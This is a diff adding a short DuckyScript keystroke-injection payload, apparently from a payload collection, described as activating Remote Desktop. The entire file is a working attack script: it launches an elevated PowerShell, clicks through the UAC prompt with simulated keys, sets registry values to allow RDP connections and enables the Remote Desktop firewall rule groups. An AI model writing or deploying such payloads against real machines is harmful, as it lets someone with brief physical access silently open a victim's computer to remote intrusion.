@@ -1,0 +1,20 @@
+REM Author: UNC0V3R3D (UNC0V3R3D#8662 on Discord)
+REM Description: Activates Remote Desktop.
+REM Version: 1.0
+REM Category: Execution
+DELAY 750
+WINDOWS d
+DELAY 1500
+WINDOWS r
+DELAY 1500
+STRING powershell 
+CTRL-SHIFT ENTER
+DELAY 1500
+LEFTARROW
+DELAY 600
+ENTER
+DELAY 1200
+GUI UP
+DELAY 1200
+ALTSTRING Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0;Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name UserAuthentication -Value 1;netsh advfirewall firewall set rule group='remote desktop - remotefx' new enable=Yes;netsh advfirewall firewall set rule group='remote desktop' new enable=Yes; exit
+ENTER
